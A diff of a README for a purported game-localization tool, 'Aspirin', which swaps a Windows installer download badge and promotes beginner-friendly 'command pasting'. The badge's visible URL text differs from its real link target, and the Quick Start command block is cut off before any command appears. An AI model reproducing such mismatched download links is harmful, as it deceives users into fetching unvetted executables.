@@ -1,10 +1,9 @@
-[![Download Now](https://img.shields.io/badge/Download-Windows%20x64-green?style=for-the-badge&logo=windows)]([https://example.com](https://github.com/EricaV4/Aspirin/releases/tag/V))
-```
-
+[![Download](https://img.shields.io/badge/Windows-x64_Installer-0078D6?style=for-the-badge&logo=windows&logoColor=white)]([https://github.com/EricaV4/Aspirin/releases/latest/download/Aspirin_Setup.exe](https://github.com/EricaV4/Aspirin/releases/tag/V))
 ## 🌍 English Version
 
 ### 🎯 Project Purpose
-**"For friends who need simplified solutions - this tool allows even complete beginners to handle game localization through simple command pasting."**
+**"For friends who need simplified solutions -
+ this tool allows even complete beginners to handle game localization through simple command pasting."**
 
 ### 🚀 Quick Start
 ```bash
